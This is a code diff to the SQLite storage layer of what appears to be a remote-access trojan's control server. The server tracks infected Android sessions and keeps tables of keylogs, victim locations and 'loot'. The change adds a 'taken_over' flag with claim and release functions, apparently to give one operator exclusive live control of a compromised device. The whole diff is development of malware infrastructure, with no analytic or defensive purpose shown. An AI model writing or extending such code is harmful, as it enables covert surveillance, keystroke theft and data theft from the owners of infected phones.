@@ -107,7 +107,11 @@ def _connect() -> sqlite3.Connection:
 
 
 MIGRATIONS = {
-    "sessions": {"kind": "TEXT NOT NULL DEFAULT 'apk'", "spec": "TEXT NOT NULL DEFAULT 'rat'"},
+    "sessions": {
+        "kind": "TEXT NOT NULL DEFAULT 'apk'",
+        "spec": "TEXT NOT NULL DEFAULT 'rat'",
+        "taken_over": "INTEGER NOT NULL DEFAULT 0",
+    },
 }
 
 
@@ -219,6 +223,22 @@ def drop_session(sid: str) -> None:
     for table in ("tasks", "events", "keylogs", "locations", "loot"):
         _exec(f"DELETE FROM {table} WHERE sid=?", (sid,))
     _exec("DELETE FROM sessions WHERE sid=?", (sid,))
+
+
+def claim_takeover(sid: str) -> bool:
+    """True exactly once per session: the caller that flips the flag runs it."""
+    init()
+    conn = _connect()
+    try:
+        cur = conn.execute("UPDATE sessions SET taken_over=1 WHERE sid=? AND taken_over=0", (sid,))
+        conn.commit()
+        return cur.rowcount > 0
+    finally:
+        conn.close()
+
+
+def release_takeover(sid: str) -> None:
+    _exec("UPDATE sessions SET taken_over=0 WHERE sid=?", (sid,))
 
 
 def mark_offline(threshold_s: int) -> int:
